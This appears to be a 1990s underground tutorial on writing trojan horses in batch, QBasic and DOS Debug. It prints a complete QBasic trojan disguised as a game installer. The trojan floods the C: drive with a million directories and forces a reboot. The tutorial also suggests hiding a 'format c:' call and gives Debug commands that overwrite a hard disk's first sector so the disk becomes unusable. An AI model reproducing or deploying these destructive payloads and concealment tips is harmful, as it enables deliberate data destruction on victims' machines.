OVERVIEW
--------

Today, viruses seem to be portrayed as anything which harms computers.  
There are many types of files like this, like trojan horses, logic bombs, 
real viruses, worms, etc.  But all these dumbass people think all of 
these are viruses.  If you do, you're a fuckin idiot and should read more.  
If you know these then skip this section.

Trojan Horse- a file hidden inside another seemingly okay file which does 
stuff the masking program doesn't do.  The name is derived from Greek
mythology, when during the Iliad the Trojans gave their enemies a big
damn horse as a gift, but armies were hidden inside.  Just a little
insight for ya.

Logic Bombs- program which has a certain condition which must be met 
before the program starts- like the Michaelangelo virus of a few years 
back.  It would only start on March 6, Michaelangelo's birthday, and
would wipe the hard drive.  However, smart people figured just set the
date wrong and skip the 6th.  

Viruses- program which reproduces itself onto several machines, 
attaching on to files to procreate.

Worms- program which spreads from machine to machine using one machine 
as a host (not used a lot)

EASY WRITING
----------

To truly write a simple trojan horse, use the simplest programming 
language.  I either use batch programming or QBasic.  I also know 
someone who does cooll stuff in DOS Debug.  All are absurdly easy to 
write and evade the scanners with.  

BATCH PROGRAMMING
-----------------

Batch programming, for those of you who are newbies or just stupid, is 
taking MS-DOS batch commands and sticking them in a file which can be 
run on its own.  

If you don't know MS-DOS commands, I'm NOT GONNA TEACH YOU CUZ YOU'RE 
STUPID!  I use Linux and Win95 but still know all the DOS commands.  
Just remember, before anything you write, put [@echo off] so that the 
person getting this doesn't know what's going on.

QBASIC stuff
------------

QBasic is a REAL simple programming language, so if you want to learn 
to program this is always a starting place.  I learned how to use the 
old BASIC in like 3rd grade, which was like 10 years ago.  Most of the 
commands are still almost the same.  And best of all, this program is 
either free or comes with your computer (on Win95 you gotta go get it).  
But it's not like I paid for any other program lately either, so to me 
everything's free!

How can we use this to do cool things?

Like this:
This is an example of a trojan horse I wrote which poses as an install 
program for a game.  The "game" is made more realistic by zipping it 
and adding bogus *.dat files which make it look like it's actually a 
real program.

Here goes:

REM bitch by Defenestrator
COLOR 14, 0
PRINT "Are you in DOS?"
INPUT x$
IF x$ = "yes" THEN GOTO 1 ELSE GOTO 2
1 PRINT "Installing datafiles..please wait..."
PRINT "This may take up to 20 minutes.."
SHELL "cd\"
FOR a = 1 TO 1000000
a$ = STR$(a)
c$ = "md" + a$ + ".hee"
SHELL c$
NEXT a
CLS
PRINT "P.I.S.S. 1.0 is now installed on your system"
PRINT "Have a shitty day!"
PRINT "Press Enter to reboot your system!"
OUT &H64, &HFE
END
2 PRINT "Go to DOS before running P.I.S.S. 1.0"
END

Let's take this SIMPLE program apart.

This simple trojan horse poses as an installer, but instead makes 1 
million directories from the c:\ drive which cannot be deleted without 
being a real pain in the ass with Norton commander, or just 
reformatting the hard drive.  

The shell "<DOS command>" runs a DOS command without showing it, which 
is good if you want to be real easy and do shell "format c:\".

It's also a good idea to get a compiler for QBasic because the code can 
be read by any text file viewer, which is the only major drawback of 
QBasic.  That and it can't draw worth shit.

So if you want to learn more QBasic, e-mail me, look in the help files, 
or keyword search on altavista.

DOS DEBUG
---------
I don't know a lot of debug, so I'm gonna reprint an article in a mail 
list I subscribe to.  This article is courtesy of w0rmh0le.  

Disclaimer: I am not responsible for any damage following the guidelines
of this text may incur on your system. These commands can be dangerous
if used incorrectly. I am not responsible for any damage of your life,
liberty, and all that good stuff, blah, blah as a result of the misuse
of any materials herein. Proceed with extreme caution. Have a nice day.

Dos Debug which is distributed with every version of Windows 95 has some
interesting commands which I think many people have overlooked. In this
post I will show you some very powerful things you can do with this
tiny, harmless little program....
Please note that commands are not case sensitive and I have used
capitals in most cases for clarification.

To start debug, go get the dos command prompt (whichever way you
prefer). You should get a hyphen "-" prompt.  You can type "?" followed
by return at this time to get a list of all (documented) commands. All
commands are followed by returns btw. Anyway, the commands we are
interested in are L (load), W (write), and F (fill),  I'll explain load
first.
        NOTE: All values must be in hexadecimal. It sounds confusing at
first, but it's really not once you know what you are doing.

To use load, one usually does something like this:
-N foo.com
-L 100

This tells the computer the name of the program you are working on, and
where to load it into memory. However, we are going to use a more arcane
method, which is called the absolute read. (voice echoes)

An absolute read simply allows you to read byte space straight off of
any disk on your computer. You do this by first typing "L" at the
hyphen, followed by the address in memory you want it loaded into,
followed by a number specifying the drive number ( 0 = A:, 1 = B:, 2 =
C:, etc. ) followed by the sector address to begin reading at followed
by the amount of bytes to read. Easy, no? Hehe.

Ex.
L 0 0 0 25
This loads 25h bytes from the first sector of the floppy disk in A: into
memory starting at offset 0h in the current segment. Note that a max of
80h bytes can be read at one time.

The write command is almost exactly the same as the read command, so it
doesn't require much explanation now except that it does the opposite of
the load command.

Ex.
W 0 0 0 25
This writes 25h bytes to A: from 0h in memory to the first sector of the
disk.

To use fill, type "F" followed by the memory address you want to start
filling at, followed by an "L", followed by how many bytes to fill and
finally the byte you want to fill with.  The "L" does not mean load, but
rather length.

Ex.
F 100 L 25 FF
This would fill 25h bytes starting at 100h in memory with the byte value
FF which, by the way, is basically meaningless.

Now for the fun part. If you understand all of the above, either you are
very persistant, or you know something of how disks really work.
Bringing it all together is the key here. I will first show you an
attack which can take less than a minute to do. My comments are followed
by the semicolons.

C:\>debug
-F 0 L 80 00    ;fill an area of memory with 00h null bytes.
-W 0 2 0 80     ;write to the drive.
-Q                    ;quit

This attack has just rendered the hard disk unusable in less than a
minutes time. I recommend IF YOU KNOW WHAT YOU ARE DOING to try this out
on a floppy disk. It will be rendered unusable. The commands follow:

C:\>debug
-F 0 L 80 00
-W 0 0 0 80     ;take note of the second zero PLEASE.
-Q

Ok, Im done with the malicious stuff, onto some fun. I have found out
that volume labels in dos start at the 27th byte of any hard or floppy
disk. Check this out:

-L 0 0 0 80  ;change the second zero to whatever if you want.
-E 27 xx xx xx xx    ;where the xx's are the new label in bytes. You
have to insert your label backwards in pairs of two.
-W 0 0 0 80     ;write to floppy.
-Q                     ;quit

The "E" commands enters our bytes into memory.

Phun ex.
-L 0 0 0 80
-E 27 66 06 00 00  ;Figure this one out on your own...
-W 0 0 0 80
-Q

There are numerous other things you can play with too, so get some debug
docs, or e-mail me for one I found. Have phun!
